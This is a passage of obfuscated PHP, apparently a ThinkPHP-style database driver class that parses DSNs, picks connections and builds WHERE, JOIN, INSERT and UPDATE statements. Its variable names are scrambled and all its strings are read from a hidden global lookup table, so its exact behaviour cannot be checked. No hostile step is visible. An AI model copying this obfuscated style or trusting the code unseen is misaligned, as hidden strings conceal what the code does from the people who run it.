$·©æÛÀØ[1041] => $€ª€÷á¡[$·©æÛÀØ[1128]], $·©æÛÀØ[21] => $€ª€÷á¡[$·©æÛÀØ[1129]], $·©æÛÀØ[1073] => $€ª€÷á¡[$·©æÛÀØ[1130]], $·©æÛÀØ[17] => isset($€ª€÷á¡[$·©æÛÀØ[1131]]) ? $€ª€÷á¡[$·©æÛÀØ[1131]] : array()); } elseif (empty($€ª€÷á¡)) { if (think_config($·©æÛÀØ[1132]) && $·©æÛÀØ[1121] != strtolower(think_config($·©æÛÀØ[1133]))) { $€ª€÷á¡ = $this->parseDSN(think_config($·©æÛÀØ[1132])); } else { $€ª€÷á¡ = array($·©æÛÀØ[1118] => think_config($·©æÛÀØ[1133]), $·©æÛÀØ[1042] => think_config($·©æÛÀØ[1134]), $·©æÛÀØ[1043] => think_config($·©æÛÀØ[1135]), $·©æÛÀØ[1040] => think_config($·©æÛÀØ[1136]), $·©æÛÀØ[1041] => think_config($·©æÛÀØ[1137]), $·©æÛÀØ[21] => think_config($·©æÛÀØ[323]), $·©æÛÀØ[1073] => think_config($·©æÛÀØ[1132]), $·©æÛÀØ[17] => think_config($·©æÛÀØ[1138])); } } return $€ª€÷á¡; } protected function initConnect($¸ÛµÊÙÈ = true) { if (1 == think_config($_SERVER[¹Éµ„ºå][22])) { $this->_linkID = $this->multiConnect($¸ÛµÊÙÈ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÃèÑË˜Â => $‡ç¿îÍ®) { $this->_linkID = $‡ç¿îÍ®; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($»Éèœ… = false) { $ö ê£Û­ =& $_SERVER[¹Éµ„ºå]; static $Úù•·ô = array(); static $‰è”Öà´ = -1; if (empty($Úù•·ô)) { foreach ($this->config as $¼ˆğ–šÃ => $Ó±´ÜÖŠ) { $Úù•·ô[$¼ˆğ–šÃ] = explode($ö ê£Û­[50], $Ó±´ÜÖŠ); } } if (think_config($ö ê£Û­[1139])) { if ($»Éèœ… || think_config($ö ê£Û­[486]) === !0) { $§€½¨¿ = floor(mt_rand(0, think_config($ö ê£Û­[1140]) - 1)); $‰è”Öà´ = $§€½¨¿; } else { if (is_numeric(think_config($ö ê£Û­[1141]))) { $§€½¨¿ = think_config($ö ê£Û­[1141]); } else { $§€½¨¿ = floor(mt_rand(think_config($ö ê£Û­[1140]), count($Úù•·ô[$ö ê£Û­[1040]]) - 1)); } } } else { $§€½¨¿ = floor(mt_rand(0, count($Úù•·ô[$ö ê£Û­[1040]]) - 1)); $‰è”Öà´ = $§€½¨¿; } $§€½¨¿ = $‰è”Öà´ !== -1 ? $‰è”Öà´ : $§€½¨¿; $­òãÓÇ¬ = array($ö ê£Û­[1042] => isset($Úù•·ô[$ö ê£Û­[1042]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[1042]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[1042]][0], $ö ê£Û­[1043] => isset($Úù•·ô[$ö ê£Û­[1043]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[1043]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[1043]][0], $ö ê£Û­[1040] => isset($Úù•·ô[$ö ê£Û­[1040]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[1040]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[1040]][0], $ö ê£Û­[1041] => isset($Úù•·ô[$ö ê£Û­[1041]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[1041]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[1041]][0], $ö ê£Û­[21] => isset($Úù•·ô[$ö ê£Û­[21]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[21]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[21]][0], $ö ê£Û­[1073] => isset($Úù•·ô[$ö ê£Û­[1073]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[1073]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[1073]][0], $ö ê£Û­[17] => isset($Úù•·ô[$ö ê£Û­[17]][$§€½¨¿]) ? $Úù•·ô[$ö ê£Û­[17]][$§€½¨¿] : $Úù•·ô[$ö ê£Û­[17]][0]); return $this->connect($­òãÓÇ¬, $§€½¨¿); } public function parseDSN($øŠªë) { $éÈèê± =& $_SERVER[¹Éµ„ºå]; if (empty($øŠªë)) { return !1; } $‹Š‹îâŒ = parse_url($øŠªë); if ($‹Š‹îâŒ[$éÈèê±[205]]) { $¼ïŒù¬ç = array($éÈèê±[1118] => $‹Š‹îâŒ[$éÈèê±[205]], $éÈèê±[1042] => isset($‹Š‹îâŒ[$éÈèê±[684]]) ? $‹Š‹îâŒ[$éÈèê±[684]] : $éÈèê±[12], $éÈèê±[1043] => isset($‹Š‹îâŒ[$éÈèê±[1142]]) ? $‹Š‹îâŒ[$éÈèê±[1142]] : $éÈèê±[12], $éÈèê±[1040] => isset($‹Š‹îâŒ[$éÈèê±[206]]) ? $‹Š‹îâŒ[$éÈèê±[206]] : $éÈèê±[12], $éÈèê±[1041] => isset($‹Š‹îâŒ[$éÈèê±[207]]) ? $‹Š‹îâŒ[$éÈèê±[207]] : $éÈèê±[12], $éÈèê±[21] => isset($‹Š‹îâŒ[$éÈèê±[87]]) ? substr($‹Š‹îâŒ[$éÈèê±[87]], 1) : $éÈèê±[12]); } else { preg_match($éÈèê±[1143], trim($øŠªë), $‰„©Óå‘); $¼ïŒù¬ç = array($éÈèê±[1118] => $‰„©Óå‘[1], $éÈèê±[1042] => $‰„©Óå‘[2], $éÈèê±[1043] => $‰„©Óå‘[3], $éÈèê±[1040] => $‰„©Óå‘[4], $éÈèê±[1041] => $‰„©Óå‘[5], $éÈèê±[21] => $‰„©Óå‘[6]); } $¼ïŒù¬ç[$éÈèê±[1073]] = $éÈèê±[12]; return $¼ïŒù¬ç; } protected function debug() { $Ö¼İ”ù¨ =& $_SERVER[¹Éµ„ºå]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ö¼İ”ù¨[1144]; if (think_config($Ö¼İ”ù¨[1145])) { think_status($Ö¼İ”ù¨[1146]); think_trace($this->queryStr . $Ö¼İ”ù¨[1147] . think_status($Ö¼İ”ù¨[24], $Ö¼İ”ù¨[1146], 6) . $Ö¼İ”ù¨[1148], $Ö¼İ”ù¨[12], $Ö¼İ”ù¨[1149]); } } protected function parseLock($˜ûüÎ¯¯ = false) { $¬ı§¨„ =& $_SERVER[¹Éµ„ºå]; if (!$˜ûüÎ¯¯) { return $¬ı§¨„[12]; } if ($¬ı§¨„[1075] == $this->dbType) { return $¬ı§¨„[1150]; } return $¬ı§¨„[1151]; } protected function parseSet($âÅşø¢æ) { $Ù³½êÔæ =& $_SERVER[¹Éµ„ºå]; foreach ($âÅşø¢æ as $ô®˜»Ş => $ö£Ìîƒª) { if (is_array($ö£Ìîƒª) && $Ù³½êÔæ[372] == $ö£Ìîƒª[0]) { $º¥ ¹ƒ¸[] = $this->parseKey($ô®˜»Ş) . $Ù³½êÔæ[464] . $ö£Ìîƒª[1]; } elseif (is_scalar($ö£Ìîƒª) || is_null($ö£Ìîƒª)) { $º¥ ¹ƒ¸[] = $this->parseKey($ô®˜»Ş) . $Ù³½êÔæ[464] . $this->parseValue($ö£Ìîƒª); } } return $Ù³½êÔæ[1152] . implode($Ù³½êÔæ[50], $º¥ ¹ƒ¸); } protected function bindParam($»ï¬Œéê, $„òßğÚ×) { $this->bind[$_SERVER[¹Éµ„ºå][4] . $»ï¬Œéê] = $„òßğÚ×; } protected function parseBind($òıÀÊ‘) { $òıÀÊ‘ = array_merge($this->bind, $òıÀÊ‘); $this->bind = array(); return $òıÀÊ‘; } function parseKey(&$û¶óÂ‚¯, $ŠŞàãû© = true) { if ($ŠŞàãû©) { $û¶óÂ‚¯ = $this->parseKeyCheck($û¶óÂ‚¯); } return $û¶óÂ‚¯; } function parseKeyCheck($†òúÑú ) { $Éê„¬ş” =& $_SERVER[¹Éµ„ºå]; $†òúÑú  = trim($†òúÑú ); if (!preg_match($Éê„¬ş”[1153], $†òúÑú )) { think_exception($Éê„¬ş”[1154] . $†òúÑú ); } return $†òúÑú ; } protected function parseValue($Ó¢º») { $ô¨²Œ¨Ş =& $_SERVER[¹Éµ„ºå]; if (is_string($Ó¢º»)) { $Ó¢º» = $ô¨²Œ¨Ş[1114] . $this->escapeString($Ó¢º») . $ô¨²Œ¨Ş[1114]; } elseif (isset($Ó¢º»[0]) && is_string($Ó¢º»[0]) && strtolower($Ó¢º»[0]) == $ô¨²Œ¨Ş[372]) { $Ó¢º» = $this->escapeString($Ó¢º»[1]); } elseif (is_array($Ó¢º»)) { $Ó¢º» = array_map(array($this, $ô¨²Œ¨Ş[1115]), $Ó¢º»); } elseif (is_bool($Ó¢º»)) { $Ó¢º» = $Ó¢º» ? $ô¨²Œ¨Ş[91] : $ô¨²Œ¨Ş[228]; } elseif (is_null($Ó¢º»)) { $Ó¢º» = $ô¨²Œ¨Ş[103]; } return $Ó¢º»; } protected function parseField($¡íÂıŠ) { $§ÃıÕäÄ =& $_SERVER[¹Éµ„ºå]; if (is_string($¡íÂıŠ) && strpos($¡íÂıŠ, $§ÃıÕäÄ[50])) { $¡íÂıŠ = explode($§ÃıÕäÄ[50], $¡íÂıŠ); } if (is_array($¡íÂıŠ)) { $êŸ¢ˆåä = array(); foreach ($¡íÂıŠ as $¡¬ØİÑ¨ => $²–ıúü) { if (!is_numeric($¡¬ØİÑ¨)) { $êŸ¢ˆåä[] = $this->parseKey($¡¬ØİÑ¨, !1) . $§ÃıÕäÄ[1155] . $this->parseKey($²–ıúü); } else { $êŸ¢ˆåä[] = $this->parseKey($²–ıúü); } } $°ÄçŞıŠ = implode($§ÃıÕäÄ[50], $êŸ¢ˆåä); } elseif (is_string($¡íÂıŠ) && !empty($¡íÂıŠ)) { $°ÄçŞıŠ = $¡íÂıŠ; } else { $°ÄçŞıŠ = $§ÃıÕäÄ[220]; } return $°ÄçŞıŠ; } protected function parseTable($†ßÒòÈÒ) { $±»¨¨œÖ =& $_SERVER[¹Éµ„ºå]; if (is_array($†ßÒòÈÒ)) { $Ì¨¼ì = array(); foreach ($†ßÒòÈÒ as $×¨üí…Õ => $Ÿ¯öù¶“) { if (!is_numeric($×¨üí…Õ)) { $Ì¨¼ì[] = $this->parseKey($×¨üí…Õ) . $±»¨¨œÖ[53] . $this->parseKey($Ÿ¯öù¶“); } else { $Ì¨¼ì[] = $this->parseKey($×¨üí…Õ); } } $†ßÒòÈÒ = $Ì¨¼ì; } elseif (is_string($†ßÒòÈÒ)) { if (strstr($†ßÒòÈÒ, $±»¨¨œÖ[53])) { return $†ßÒòÈÒ; } $†ßÒòÈÒ = explode($±»¨¨œÖ[50], $†ßÒòÈÒ); array_walk($†ßÒòÈÒ, array($this, $±»¨¨œÖ[1060])); } return $±»¨¨œÖ[1054] . trim(implode($±»¨¨œÖ[1156], $†ßÒòÈÒ), $±»¨¨œÖ[475]) . $±»¨¨œÖ[1054]; } protected function parseWhere($£ú¥ßÚ¼) { $ Úñõ—Ç =& $_SERVER[¹Éµ„ºå]; $ˆˆÚ÷æ® = $ Úñõ—Ç[12]; if (is_string($£ú¥ßÚ¼)) { $ˆˆÚ÷æ® = $£ú¥ßÚ¼; } else { $àçÑÙÓ = isset($£ú¥ßÚ¼[$ Úñõ—Ç[1157]]) ? strtoupper($£ú¥ßÚ¼[$ Úñõ—Ç[1157]]) : $ Úñõ—Ç[12]; if (in_array($àçÑÙÓ, array($ Úñõ—Ç[1158], $ Úñõ—Ç[1159], $ Úñõ—Ç[1160]))) { $àçÑÙÓ = $ Úñõ—Ç[53] . $àçÑÙÓ . $ Úñõ—Ç[53]; unset($£ú¥ßÚ¼[$ Úñõ—Ç[1157]]); } else { $àçÑÙÓ = $ Úñõ—Ç[1161]; } foreach ($£ú¥ßÚ¼ as $Ğß’Çûë => $¨ÖÜ×„) { $ˆˆÚ÷æ® .= $ Úñõ—Ç[355]; if (is_numeric($Ğß’Çûë)) { $Ğß’Çûë = $ Úñõ—Ç[1162]; } if (0 === strpos($Ğß’Çûë, $ Úñõ—Ç[11])) { $ˆˆÚ÷æ® .= $this->parseThinkWhere($Ğß’Çûë, $¨ÖÜ×„); } else { if (!preg_match($ Úñõ—Ç[1163], trim($Ğß’Çûë))) { think_exception(think_lang($ Úñõ—Ç[1164]) . $ Úñõ—Ç[4] . $Ğß’Çûë); } $¹‹‡§ÛÚ = is_array($¨ÖÜ×„) && isset($¨ÖÜ×„[$ Úñõ—Ç[1165]]); $Ğß’Çûë = trim($Ğß’Çûë); if (strpos($Ğß’Çûë, $ Úñõ—Ç[212])) { $€³Ë—Àï = explode($ Úñõ—Ç[212], $Ğß’Çûë); $Â‚Éğ–£ = array(); foreach ($€³Ë—Àï as $÷â¿†Î£ => $ñôó£¤») { $ÖÁõæ î = $¹‹‡§ÛÚ ? $¨ÖÜ×„[$÷â¿†Î£] : $¨ÖÜ×„; $Â‚Éğ–£[] = $ Úñõ—Ç[337] . $this->parseWhereItem($this->parseKey($ñôó£¤»), $ÖÁõæ î) . $ Úñõ—Ç[1059]; } $ˆˆÚ÷æ® .= implode($ Úñõ—Ç[1166], $Â‚Éğ–£); } elseif (strpos($Ğß’Çûë, $ Úñõ—Ç[284])) { $€³Ë—Àï = explode($ Úñõ—Ç[284], $Ğß’Çûë); $Â‚Éğ–£ = array(); foreach ($€³Ë—Àï as $÷â¿†Î£ => $ñôó£¤») { $ÖÁõæ î = $¹‹‡§ÛÚ ? $¨ÖÜ×„[$÷â¿†Î£] : $¨ÖÜ×„; $Â‚Éğ–£[] = $ Úñõ—Ç[337] . $this->parseWhereItem($this->parseKey($ñôó£¤»), $ÖÁõæ î) . $ Úñõ—Ç[1059]; } $ˆˆÚ÷æ® .= implode($ Úñõ—Ç[1161], $Â‚Éğ–£); } else { $ˆˆÚ÷æ® .= $this->parseWhereItem($this->parseKey($Ğß’Çûë), $¨ÖÜ×„); } } $ˆˆÚ÷æ® .= $ Úñõ—Ç[356] . $àçÑÙÓ; } $ˆˆÚ÷æ® = substr($ˆˆÚ÷æ®, 0, -strlen($àçÑÙÓ)); } return empty($ˆˆÚ÷æ®) ? $ Úñõ—Ç[12] : $ Úñõ—Ç[1167] . $ˆˆÚ÷æ®; } protected function parseWhereItem($ñÅâ¯Àô, $Â«ŒóÓ²) { $á¿Àâ­ =& $_SERVER[¹Éµ„ºå]; $â®ÒÈªŞ = $á¿Àâ­[12]; if (is_array($Â«ŒóÓ²)) { if (is_string($Â«ŒóÓ²[0])) { $·É“§¬ = strtolower($Â«ŒóÓ²[0]); if (in_array($Â«ŒóÓ²[0], array($á¿Àâ­[464], $á¿Àâ­[1168], $á¿Àâ­[1169], $á¿Àâ­[1170], $á¿Àâ­[1171], $á¿Àâ­[1172]))) { $â®ÒÈªŞ .= $ñÅâ¯Àô . $á¿Àâ­[53] . $Â«ŒóÓ²[0] . $á¿Àâ­[53] . $this->parseValue($Â«ŒóÓ²[1]); } elseif (preg_match($á¿Àâ­[1173], $Â«ŒóÓ²[0])) { $â®ÒÈªŞ .= $ñÅâ¯Àô . $á¿Àâ­[53] . $this->exp[$·É“§¬] . $á¿Àâ­[53] . $this->parseValue($Â«ŒóÓ²[1]); } elseif (preg_match($á¿Àâ­[1174], $Â«ŒóÓ²[0])) { if (is_array($Â«ŒóÓ²[1])) { $’Ê«£ÕÍ = isset($Â«ŒóÓ²[2]) ? strtoupper($Â«ŒóÓ²[2]) : $á¿Àâ­[1159]; if (in_array($’Ê«£ÕÍ, array($á¿Àâ­[1158], $á¿Àâ­[1159], $á¿Àâ­[1160]))) { $—ø›Õşà = array(); foreach ($Â«ŒóÓ²[1] as $®›ù–³µ) { $—ø›Õşà[] = $ñÅâ¯Àô . $á¿Àâ­[53] . $this->exp[$·É“§¬] . $á¿Àâ­[53] . $this->parseValue($®›ù–³µ); } $â®ÒÈªŞ .= $á¿Àâ­[337] . implode($á¿Àâ­[53] . $’Ê«£ÕÍ . $á¿Àâ­[53], $—ø›Õşà) . $á¿Àâ­[1059]; } } else { $â®ÒÈªŞ .= $ñÅâ¯Àô . $á¿Àâ­[53] . $this->exp[$·É“§¬] . $á¿Àâ­[53] . $this->parseValue($Â«ŒóÓ²[1]); } } elseif ($á¿Àâ­[372] == $·É“§¬) { $â®ÒÈªŞ .= $á¿Àâ­[1057] . $ñÅâ¯Àô . $á¿Àâ­[53] . $Â«ŒóÓ²[1] . $á¿Àâ­[1175]; } elseif (preg_match($á¿Àâ­[1176], $Â«ŒóÓ²[0])) { $â®ÒÈªŞ .= $Â«ŒóÓ²[0]; } elseif (preg_match($á¿Àâ­[1177], $Â«ŒóÓ²[0])) { if (isset($Â«ŒóÓ²[2]) && $á¿Àâ­[372] == $Â«ŒóÓ²[2]) { $â®ÒÈªŞ .= $ñÅâ¯Àô . $á¿Àâ­[53] . $this->exp[$·É“§¬] . $á¿Àâ­[53] . $Â«ŒóÓ²[1]; } else { if (is_string($Â«ŒóÓ²[1])) { $Â«ŒóÓ²[1] = explode($á¿Àâ­[50], $Â«ŒóÓ²[1]); } $Œ¤¶Ş±¶ = implode($á¿Àâ­[50], $this->parseValue($Â«ŒóÓ²[1])); $â®ÒÈªŞ .= $ñÅâ¯Àô . $á¿Àâ­[53] . $this->exp[$·É“§¬] . $á¿Àâ­[1057] . $Œ¤¶Ş±¶ . $á¿Àâ­[1059]; } } elseif (preg_match($á¿Àâ­[1178], $Â«ŒóÓ²[0])) { $œ‘ÍÊÓş = is_string($Â«ŒóÓ²[1]) ? explode($á¿Àâ­[50], $Â«ŒóÓ²[1]) : $Â«ŒóÓ²[1]; $â®ÒÈªŞ .= $á¿Àâ­[1057] . $ñÅâ¯Àô . $á¿Àâ­[53] . $this->exp[$·É“§¬] . $á¿Àâ­[53] . $this->parseValue($œ‘ÍÊÓş[0]) . $á¿Àâ­[1161] . $this->parseValue($œ‘ÍÊÓş[1]) . $á¿Àâ­[356]; } else { think_exception(think_lang($á¿Àâ­[1164]) . $á¿Àâ­[4] . $Â«ŒóÓ²[0]); } } else { $ØÜÊ‚—í = count($Â«ŒóÓ²); $ÜÁ»¹ûË = $á¿Àâ­[12]; if (is_string($Â«ŒóÓ²[$ØÜÊ‚—í - 1])) { $ÜÁ»¹ûË = isset($Â«ŒóÓ²[$ØÜÊ‚—í - 1]) ? strtoupper($Â«ŒóÓ²[$ØÜÊ‚—í - 1]) : $á¿Àâ­[12]; if (in_array($ÜÁ»¹ûË, array($á¿Àâ­[1158], $á¿Àâ­[1159], $á¿Àâ­[1160]))) { $ØÜÊ‚—í = $ØÜÊ‚—í - 1; } } else { $ÜÁ»¹ûË = $á¿Àâ­[1158]; } for ($˜Àõî©ø = 0; $˜Àõî©ø < $ØÜÊ‚—í; $˜Àõî©ø++) { $œ‘ÍÊÓş = is_array($Â«ŒóÓ²[$˜Àõî©ø]) ? $Â«ŒóÓ²[$˜Àõî©ø][1] : $Â«ŒóÓ²[$˜Àõî©ø]; if ($á¿Àâ­[372] == strtolower($Â«ŒóÓ²[$˜Àõî©ø][0])) { $â®ÒÈªŞ .= $á¿Àâ­[337] . $ñÅâ¯Àô . $á¿Àâ­[53] . $œ‘ÍÊÓş . $á¿Àâ­[1175] . $ÜÁ»¹ûË . $á¿Àâ­[53]; } else { $¹Ä¨ê‚î = is_array($Â«ŒóÓ²[$˜Àõî©ø]) ? $this->exp[strtolower($Â«ŒóÓ²[$˜Àõî©ø][0])] : $á¿Àâ­[464]; if (!$¹Ä¨ê‚î && is_array($Â«ŒóÓ²[$˜Àõî©ø]) && in_array($Â«ŒóÓ²[$˜Àõî©ø][0], array($á¿Àâ­[464], $á¿Àâ­[1168], $á¿Àâ­[1169], $á¿Àâ­[1170], $á¿Àâ­[1171], $á¿Àâ­[1172]))) { $¹Ä¨ê‚î = $Â«ŒóÓ²[$˜Àõî©ø][0]; } $â®ÒÈªŞ .= $á¿Àâ­[337] . $ñÅâ¯Àô . $á¿Àâ­[53] . $¹Ä¨ê‚î . $á¿Àâ­[53] . $this->parseValue($œ‘ÍÊÓş) . $á¿Àâ­[1175] . $ÜÁ»¹ûË . $á¿Àâ­[53]; } } $â®ÒÈªŞ = substr($â®ÒÈªŞ, 0, -4); } } else { $â®ÒÈªŞ .= $ñÅâ¯Àô . $á¿Àâ­[1179] . $this->parseValue($Â«ŒóÓ²); } return $â®ÒÈªŞ; } protected function parseThinkWhere($‰¶…‚§Ó, $ß÷ç§Ì) { $Á²¿Ùáœ =& $_SERVER[¹Éµ„ºå]; $Œ·–³† = $Á²¿Ùáœ[12]; switch ($‰¶…‚§Ó) { case $Á²¿Ùáœ[427]: $Œ·–³† = $ß÷ç§Ì; break; case $Á²¿Ùáœ[1162]: $Œ·–³† = is_string($ß÷ç§Ì) ? $ß÷ç§Ì : substr($this->parseWhere($ß÷ç§Ì), 6); break; case $Á²¿Ùáœ[1180]: parse_str($ß÷ç§Ì, $î€‰„õÁ); if (isset($î€‰„õÁ[$Á²¿Ùáœ[1157]])) { $¾âîÑÒ = $Á²¿Ùáœ[53] . strtoupper($î€‰„õÁ[$Á²¿Ùáœ[1157]]) . $Á²¿Ùáœ[53]; unset($î€‰„õÁ[$Á²¿Ùáœ[1157]]); } else { $¾âîÑÒ = $Á²¿Ùáœ[1161]; } $‰ÁÅ™‡· = array(); foreach ($î€‰„õÁ as $–¥ÜñÃ => $Éá¯¹•ê) { $‰ÁÅ™‡·[] = $this->parseKey($–¥ÜñÃ) . $Á²¿Ùáœ[1179] . $this->parseValue($Éá¯¹•ê); } $Œ·–³† = implode($¾âîÑÒ, $‰ÁÅ™‡·); break; } return $Œ·–³†; } protected function parseLimit($·—Êß) { $‰Û”¢¡Ñ =& $_SERVER[¹Éµ„ºå]; return !empty($·—Êß) ? $‰Û”¢¡Ñ[51] . $·—Êß . $‰Û”¢¡Ñ[53] : $‰Û”¢¡Ñ[12]; } protected function parseJoin($ô•¸Åô) { $ŞÎ¹Â ² =& $_SERVER[¹Éµ„ºå]; $®øÔ¶‹ë = $ŞÎ¹Â ²[12]; if (!empty($ô•¸Åô)) { if (is_array($ô•¸Åô)) { foreach ($ô•¸Åô as $‹ôÏÏ => $ç¯åíÚ¡) { if (!1 !== stripos($ç¯åíÚ¡, $ŞÎ¹Â ²[1181])) { $®øÔ¶‹ë .= $ŞÎ¹Â ²[53] . $ç¯åíÚ¡; } else { $®øÔ¶‹ë .= $ŞÎ¹Â ²[1182] . $ç¯åíÚ¡; } } } else { $®øÔ¶‹ë .= $ŞÎ¹Â ²[1182] . $ô•¸Åô; } } $®øÔ¶‹ë = preg_replace($ŞÎ¹Â ²[1183], think_config($ŞÎ¹Â ²[1087]) . $ŞÎ¹Â ²[1184], $®øÔ¶‹ë); return $®øÔ¶‹ë; } protected function parseOrder($ÄØÛŞöâ) { $ µ…§ñˆ =& $_SERVER[¹Éµ„ºå]; if (is_array($ÄØÛŞöâ)) { $ëßÍá² = array(); foreach ($ÄØÛŞöâ as $¼ŞŠ™È´ => $±ğóª¥‘) { if (is_numeric($¼ŞŠ™È´)) { $ëßÍá²[] = $this->parseKey($±ğóª¥‘); } else { $±ğóª¥‘ = in_array(strtoupper(trim($±ğóª¥‘)), array($ µ…§ñˆ[1185], $ µ…§ñˆ[1186])) ? $ µ…§ñˆ[53] . $±ğóª¥‘ : $ µ…§ñˆ[12]; if (preg_match($ µ…§ñˆ[1187], $¼ŞŠ™È´)) { $ëßÍá²[] = $this->parseKey($¼ŞŠ™È´) . $±ğóª¥‘; } else { think_exception($ µ…§ñˆ[1188] . $¼ŞŠ™È´); } } } $ÄØÛŞöâ = implode($ µ…§ñˆ[50], $ëßÍá²); } return !empty($ÄØÛŞöâ) ? $ µ…§ñˆ[1189] . $ÄØÛŞöâ : $ µ…§ñˆ[12]; } protected function parseGroup($´¡Û¨àØ) { $–×öí¾Ë =& $_SERVER[¹Éµ„ºå]; return !empty($´¡Û¨àØ) ? $–×öí¾Ë[1190] . $´¡Û¨àØ : $–×öí¾Ë[12]; } protected function parseHaving($À´ñÉ½Ä) { $Œ‚Ù÷‡Ø =& $_SERVER[¹Éµ„ºå]; return !empty($À´ñÉ½Ä) ? $Œ‚Ù÷‡Ø[1191] . $À´ñÉ½Ä : $Œ‚Ù÷‡Ø[12]; } protected function parseComment($Á­‡ëµ) { $°Ù¬şœ¿ =& $_SERVER[¹Éµ„ºå]; return !empty($Á­‡ëµ) ? $°Ù¬şœ¿[1192] . $Á­‡ëµ . $°Ù¬şœ¿[1193] : $°Ù¬şœ¿[12]; } protected function parseDistinct($ÜúìÀã²) { $ÉÉ¤×¨Ş =& $_SERVER[¹Éµ„ºå]; return !empty($ÜúìÀã²) ? $ÉÉ¤×¨Ş[1194] : $ÉÉ¤×¨Ş[12]; } protected function parseUnion($ã£€ğü×) { $î”¸Ë‘Ë =& $_SERVER[¹Éµ„ºå]; if (empty($ã£€ğü×)) { return $î”¸Ë‘Ë[12]; } if (isset($ã£€ğü×[$î”¸Ë‘Ë[423]])) { $Íéå§²® = $î”¸Ë‘Ë[1195]; unset($ã£€ğü×[$î”¸Ë‘Ë[423]]); } else { $Íéå§²® = $î”¸Ë‘Ë[1196]; } foreach ($ã£€ğü× as $°Ê¹¬™õ) { $º‰åÖè[] = $Íéå§²® . (is_array($°Ê¹¬™õ) ? $this->buildSelectSql($°Ê¹¬™õ) : $°Ê¹¬™õ); } return implode($î”¸Ë‘Ë[53], $º‰åÖè); } public function insert($‘Ã‰µ, $­ÌÆÍ£ö = array(), $ƒšĞ¸ÅÍ = false) { $…‚°«„Ü =& $_SERVER[¹Éµ„ºå]; $âäÆ“¹‰ = $××ªâå = array(); $this->model = $­ÌÆÍ£ö[$…‚°«„Ü[359]]; foreach ($‘Ã‰µ as $‚‰Ä¯Í¸ => $Ê˜ıÜŒî) { if (is_array($Ê˜ıÜŒî) && $…‚°«„Ü[372] == $Ê˜ıÜŒî[0]) { $××ªâå[] = $this->parseKey($‚‰Ä¯Í¸); $âäÆ“¹‰[] = $Ê˜ıÜŒî[1]; } elseif (is_scalar($Ê˜ıÜŒî) || is_null($Ê˜ıÜŒî)) { $××ªâå[] = $this->parseKey($‚‰Ä¯Í¸); $âäÆ“¹‰[] = $this->parseValue($Ê˜ıÜŒî); } } $ëşÊûÈ = ($ƒšĞ¸ÅÍ ? $…‚°«„Ü[1061] : $…‚°«„Ü[1062]) . $…‚°«„Ü[1063] . $this->parseTable($­ÌÆÍ£ö[$…‚°«„Ü[357]]) . $…‚°«„Ü[1057] . implode($…‚°«„Ü[50], $××ªâå) . $…‚°«„Ü[1058] . implode($…‚°«„Ü[50], $âäÆ“¹‰) . $…‚°«„Ü[1059]; $ëşÊûÈ .= $this->parseLock(isset($­ÌÆÍ£ö[$…‚°«„Ü[991]]) ? $­ÌÆÍ£ö[$…‚°«„Ü[991]] : !1); $ëşÊûÈ .= $this->parseComment(!empty($­ÌÆÍ£ö[$…‚°«„Ü[429]]) ? $­ÌÆÍ£ö[$…‚°«„Ü[429]] : $…‚°«„Ü[12]); return $this->execute($ëşÊûÈ, $this->parseBind(!empty($­ÌÆÍ£ö[$…‚°«„Ü[361]]) ? $­ÌÆÍ£ö[$…‚°«„Ü[361]] : array())); } public function selectInsert($‘½Î·–€, $—¨øÇ¾ş, $¯¶òæ’ = array()) { $º’İÕ¾ =& $_SERVER[¹Éµ„ºå]; $this->model = $¯¶òæ’[$º’İÕ¾[359]]; if (is_string($‘½Î·–€)) { $‘½Î·–€ = explode($º’İÕ¾[50], $‘½Î·–€); } array_walk($‘½Î·–€, array($this, $º’İÕ¾[1060])); $íÚ¸Àş = $º’İÕ¾[1197] . $this->parseTable($—¨øÇ¾ş) . $º’İÕ¾[1057] . implode($º’İÕ¾[50], $‘½Î·–€) . $º’İÕ¾[1175]; $íÚ¸Àş .= $this->buildSelectSql($¯¶òæ’); return $this->execute($íÚ¸Àş, $this->parseBind(!empty($¯¶òæ’[$º’İÕ¾[361]]) ? $¯¶òæ’[$º’İÕ¾[361]] : array())); } public function update($¡¾»Ïõµ, $äÓÙÎ…) { $¶ÀÈÌå =& $_SERVER[¹Éµ„ºå]; $this->model = $äÓÙÎ…[$¶ÀÈÌå[359]]; $‘”ß£‚Í = $¶ÀÈÌå[1198] . $this->parseTable($äÓÙÎ…[$¶ÀÈÌå[357]]) . $this->parseSet($¡¾»Ïõµ) . $this->parseWhere(!empty($äÓÙÎ…[$¶ÀÈÌå[353]]) ? $äÓÙÎ…[$¶ÀÈÌå[353]] : $¶ÀÈÌå[12]) . $this->parseOrder(!empty($äÓÙÎ…[$¶ÀÈÌå[441]]) ? $äÓÙÎ…[$¶ÀÈÌå[441]] : $¶ÀÈÌå[12]) . $this->parseLimit(!empty($äÓÙÎ…[$¶ÀÈÌå[368]]) ? $äÓÙÎ…[$¶ÀÈÌå[368]] : $¶ÀÈÌå[12]) . $this->parseLock(isset($äÓÙÎ…[$¶ÀÈÌå[991]]) ? $äÓÙÎ…[$¶ÀÈÌå[991]] : !1) . $this->parseComment(!empty($äÓÙÎ…[$¶ÀÈÌå[429]]) ? $äÓÙÎ…[$¶ÀÈÌå[429]] : $¶ÀÈÌå[12]); return $this->execute($‘”ß£‚Í, $this->parseBind(!empty($äÓÙÎ…[$¶ÀÈÌå[361]]) ? $äÓÙÎ…[$¶ÀÈÌå[361]] : array())); } public function delete($…‰üç‘š = array()) { $êªñï©Ñ =& $_SERVER[¹Éµ„ºå]; $this->model = 